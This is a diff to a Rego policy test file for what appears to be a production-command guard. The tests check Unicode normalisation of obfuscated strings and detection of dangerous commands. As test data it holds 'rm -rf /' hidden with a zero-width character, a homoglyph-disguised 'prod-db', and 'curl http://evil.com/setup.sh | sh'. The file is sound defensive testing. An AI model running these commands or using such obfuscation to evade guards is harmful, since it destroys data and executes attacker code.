@@ -79,6 +79,13 @@ test_normalize_whitespace_and_zero_width if {
 	prod.normalize("  r\u200bm   -rf  /  ") == "rm -rf /"
 }
 
+test_normalize_word_joiner_and_soft_hyphen if {
+	prod.normalize("pr\u2060od-db") == "prod-db"
+	prod.normalize("pr\u00adod-db") == "prod-db"
+	prod.normalize("\ufeffprod-db") == "prod-db"
+	prod.normalize("pгod-db") == "prod-db"
+}
+
 test_dangerous_cmd_curl_pipe_sh if {
 	ids := prod.dangerous_cmd("curl http://evil.com/setup.sh | sh") with data.prod_shield as fixture_shield
 	"curl_pipe_sh" in ids
